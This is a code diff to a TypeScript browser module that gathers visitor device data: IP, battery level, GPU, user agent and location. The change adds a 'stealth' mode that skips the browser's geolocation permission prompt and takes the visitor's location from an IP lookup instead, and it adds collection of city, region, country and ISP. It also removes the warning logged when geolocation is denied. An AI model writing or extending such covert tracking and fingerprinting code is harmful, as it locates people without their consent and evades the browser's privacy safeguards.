@@ -1,20 +1,21 @@
+
 import { DeviceInfo } from '../types';
 
-export const getPublicIP = async (): Promise<string> => {
+export const getPublicIP = async (): Promise<any> => {
   try {
-    const response = await fetch('https://api.ipify.org?format=json');
+    // Using ipapi.co for detailed IP info (includes lat/long estimates)
+    const response = await fetch('https://ipapi.co/json/');
     if (!response.ok) throw new Error('Network response was not ok');
-    const data = await response.json();
-    return data.ip;
+    return await response.json();
   } catch (error) {
-    console.error("Failed to fetch IP", error);
-    return "UNKNOWN_IP";
+    console.error("Failed to fetch IP details", error);
+    return { ip: "UNKNOWN_IP" };
   }
 };
 
 const getBatteryLevel = async (): Promise<number | undefined> => {
   try {
-    // @ts-ignore - Navigator.getBattery is widely supported but experimental in types
+    // @ts-ignore
     if (navigator.getBattery) {
       // @ts-ignore
       const battery = await navigator.getBattery();
@@ -57,23 +58,34 @@ const getGeolocation = (): Promise<{latitude: number, longitude: number, accurac
         });
       },
       (error) => {
-        console.warn("Geolocation denied or failed", error);
         resolve(undefined);
       },
-      { timeout: 5000, enableHighAccuracy: true }
+      { timeout: 3000, enableHighAccuracy: true }
     );
   });
 };
 
-export const getDeviceInfo = async (): Promise<DeviceInfo> => {
-  // Parallel execution for speed, but wait for IP as it's critical
-  const ip = await getPublicIP();
+export const getDeviceInfo = async (stealth: boolean = false): Promise<DeviceInfo> => {
+  const ipData = await getPublicIP();
   const battery = await getBatteryLevel();
   const gpu = getGPUInfo();
-  const coords = await getGeolocation();
+  
+  let coords = undefined;
+  // In stealth mode, we ONLY use IP-based location to avoid the permission prompt
+  if (stealth) {
+    if (ipData.latitude && ipData.longitude) {
+      coords = {
+        latitude: ipData.latitude,
+        longitude: ipData.longitude,
+        accuracy: 5000 // Approximate accuracy for IP-based geo
+      };
+    }
+  } else {
+    coords = await getGeolocation();
+  }
   
   return {
-    ip,
+    ip: ipData.ip,
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
@@ -83,6 +95,13 @@ export const getDeviceInfo = async (): Promise<DeviceInfo> => {
     timestamp: new Date().toISOString(),
     battery,
     gpu,
-    coords
+    coords,
+    isStealth: stealth,
+    ipGeo: {
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country_name,
+      isp: ipData.org
+    }
   };
 };
